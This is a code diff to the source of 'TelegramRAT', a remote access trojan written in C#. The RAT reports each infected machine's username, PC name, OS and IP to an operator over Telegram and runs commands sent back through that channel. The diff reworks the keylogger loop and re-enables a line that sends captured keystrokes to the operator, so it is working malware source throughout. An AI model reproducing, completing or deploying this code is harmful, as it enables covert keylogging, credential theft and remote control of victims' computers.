@@ -61,7 +61,7 @@ namespace TelegramRAT
             InitializeCommands(Commands);
             try
             {
-                Run().Wait();
+                Run();
             }
             catch (Exception ex)
             {
@@ -77,6 +77,7 @@ namespace TelegramRAT
                 Commands.Clear();
                 Main(args);
             }
+            Console.WriteLine("adfhskldh");
         }
 
         static async void ReportError(Message message, Exception exception)
@@ -88,22 +89,22 @@ namespace TelegramRAT
 #endif
         }
 
-        static async Task Run()
+        static void Run()
         {
-            Message hellomsg = await Bot.SendTextMessageAsync(OwnerId,
+            Message hellomsg = Bot.SendTextMessageAsync(OwnerId,
                 $"Target online! \n\n" +
 
                 $"Username: <b>{Environment.UserName}</b>\n" +
                 $"PC name: <b>{Environment.MachineName}</b>\n" +
                 $"OS: {Utils.GetWindowsVersion()}\n\n" +
-                $"IP: {await Utils.GetIpAddress()}",
-                ParseMode.Html);
+                $"IP: {Utils.GetIpAddress().Result}",
+                ParseMode.Html).Result;
 
             int offset = 0;
 
             while (true)
             {
-                Update[] updates = await Bot.GetUpdatesAsync(offset);
+                Update[] updates = Bot.GetUpdatesAsync(offset).Result;
                 if (updates.Length != 0)
                     offset = updates.Last().Id + 1;
 
@@ -112,7 +113,7 @@ namespace TelegramRAT
                     return update.Message != null && update.Message.Date > hellomsg.Date;
                 }).ToArray();
 
-                UpdateWorker(updates).Wait();
+                _ = UpdateWorker(updates);
 
                 Task.Delay(PollingDelay).Wait();
             }
@@ -147,7 +148,7 @@ namespace TelegramRAT
 
                 if (cmd.ValidateModel(model))
                 {
-                    await cmd.Execute.Invoke(model);
+                    _ = cmd.Execute.Invoke(model);
                 }
                 else
                 {
@@ -762,18 +763,16 @@ namespace TelegramRAT
                 Example = "message Lorem ipsum",
                 Execute = async model =>
                 {
-                    await Task.Run(() =>
+
+                    try
                     {
-                        try
-                        {
-                            WinAPI.ShowMessageBox(model.RawArgs, "Message", WinAPI.MsgBoxFlag.MB_APPLMODAL | WinAPI.MsgBoxFlag.MB_ICONINFORMATION);
-                            Bot.SendTextMessageAsync(model.Message.Chat.Id, "Sended!", replyToMessageId: model.Message.MessageId);
-                        }
-                        catch (Exception ex)
-                        {
-                            ReportError(model.Message, ex);
-                        }
-                    });
+                        _ = WinAPI.ShowMessageBoxAsync(model.RawArgs, "Message", WinAPI.MsgBoxFlag.MB_APPLMODAL | WinAPI.MsgBoxFlag.MB_ICONINFORMATION);
+                        await Bot.SendTextMessageAsync(model.Message.Chat.Id, "Sended!", replyToMessageId: model.Message.MessageId);
+                    }
+                    catch (Exception ex)
+                    {
+                        ReportError(model.Message, ex);
+                    }
                 }
 
             });
@@ -1324,36 +1323,20 @@ namespace TelegramRAT
                             while (keylog)
                             {
                                 shit.Clear();
-                                bool hasAtLeastOneKey = false;
-
-                                Console.WriteLine(Keylogger.GetPressingKeys().FirstOrDefault());
-                                
-                                if (!hasAtLeastOneKey && LastKeys.Count > 0)
+                                var keys = Keylogger.GetPressingKeys();
+                                if (LastKeys.SequenceEqual(keys) is not true)
                                 {
-                                    char mappedKeycode = WinAPI.MapVirtualKey(LastKeys[0]);
-                                    for (int i = 0; i < LastKeys.Count; i++)
+                                    foreach (var key in keys)
                                     {
-                                        mappedKeycode = WinAPI.MapVirtualKey(LastKeys[i]);
-                                        if ((int)mappedKeycode == 0)
-                                            mappedKeys.Append(LastKeys[i].ToString() + ";");
-                                        else
-                                            mappedKeys.Append(mappedKeycode + ";");
+                                        unmappedKeys.Append(key.ToString("X") + ";");
+                                        mappedKeys.Append(WinAPI.MapVirtualKey(key));
+                                        mappedKeys.Append(" ");
+                                        unmappedKeys.Append(" ");
+                                    }
+                                    LastKeys = keys;
+                                }
 
-                                        unmappedKeys.Append(LastKeys[i].ToString("X") + ";");
-                                    }
-                                    mappedKeys.Append(" ");
-                                    unmappedKeys.Append(" ");
-                                    LastKeys.Clear();
-                                    continue;
-                                }
-                                foreach (uint v in shit)
-                                {
-                                    if (!LastKeys.Contains(v))
-                                    {
-                                        LastKeys.Add(v);
-                                    }
-                                }
-                                Task.Delay(100).Wait();
+                                Task.Delay(50).Wait();
                             }
                             using (FileStream keylogFileStream = System.IO.File.Create("keylog.txt"))
                             {
@@ -1365,7 +1348,7 @@ namespace TelegramRAT
                                 streamWriter.WriteLine("\n#Keycodes table - https://docs.microsoft.com/ru-ru/windows/win32/inputdev/virtual-key-codes");
                                 streamWriter.Close();
                             }
-                            //Bot.SendTextMessageAsync(model.Message.From.Id, "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName + ": \n" + mappedKeys.ToString());
+                            Bot.SendTextMessageAsync(model.Message.From.Id, "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName + ": \n" + mappedKeys.ToString());
 
                             using (FileStream fs = new FileStream("keylog.txt", FileMode.Open))
                             {
@@ -1378,6 +1361,7 @@ namespace TelegramRAT
                             ReportError(model.Message, ex);
                         }
                     });
+                    Console.WriteLine("aboba");
                 }
             });
 
